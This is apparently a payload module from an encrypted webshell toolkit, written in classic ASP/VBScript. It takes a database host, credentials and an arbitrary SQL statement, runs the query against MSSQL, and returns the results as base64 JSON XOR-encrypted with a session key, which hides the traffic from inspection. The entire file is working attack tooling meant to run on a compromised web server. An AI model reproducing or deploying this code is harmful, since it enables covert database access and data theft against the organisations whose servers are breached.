Function Base64Encode(sText)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Encrypt(data)
	key=Session("k")
	size=len(data)
	For i=1 To size
		encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))
	Next
	Encrypt=encryptResult
End Function

Sub SendErr(Err)'检查错误处理
	If Err Then
		message= Err.Description&"Error Source:"&Err.Source
		finalResult="{""status"":"""&Base64Encode("fail")&""",""msg"":"""&Base64Encode(message)&"""}"
		Response.binarywrite(Encrypt(finalResult))
		'Response.write(finalResult)
		Response.End
	End If
End Sub



Sub main(arrArgs)
	on error resume next
	dbType=arrArgs(0)
	host=arrArgs(1)
	port=arrArgs(2)
	username=arrArgs(3)
	pass=arrArgs(4)
	database=arrArgs(5)
	sql=arrArgs(6)

	Dim conn
	Set conn = Server.CreateObject("ADODB.Connection")
	Dim ds
	ds = host & "," & port
	Dim connString
	If IsEmpty(database) or database="" Then
		connString = "Provider=SQLOLEDB;Data Source=" & ds & ";Network Library=DBMSSOCN;User Id=" & username & ";Password=" & pass & ";"
	Else
		connString = "Provider=SQLOLEDB;Data Source=" & ds & ";Network Library=DBMSSOCN;Initial Catalog=" & database & ";User Id=" & username & ";Password=" & pass & ";"
	End If
	conn.Open connString

	If conn.Errors.Count > 0 Then
		SendErr Err
	End If

	Set rs = conn.Execute(sql)
	If conn.Errors.Count > 0 Then
		SendErr Err
	Else
		Dim fieldArr,filedNum
		filedNum=rs.Fields.count
		ReDim  fieldArr(filedNum-1)
		For i=0 To filedNum-1
			fieldArr(i)=rs.Fields(i).Name
		Next
		finalResult="["
		finalResult=finalResult&"["
		For Each objField in rs.Fields
			finalResult=finalResult&"{""name"":"""&objField.Name&"""},"
		Next
		finalResult=finalResult&"]"

		While Not rs.EOF
			rowStr=",["
			
			For Each objField in rs.Fields
				rowStr=rowStr&""""&rs(objField.Name)&""","
				'Response.Write "<td>" & rs(objField.Name) & "</td>"
			Next
			rowStr=rowStr&"]"
			finalResult=finalResult&rowStr
			rs.MoveNext
		Wend
		finalResult=finalResult&"]"
		rs.Close
	End If
	conn.Close
	Set conn = Nothing
	finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(finalResult)&"""}"
	Response.binarywrite(Encrypt(finalResult))
End Sub

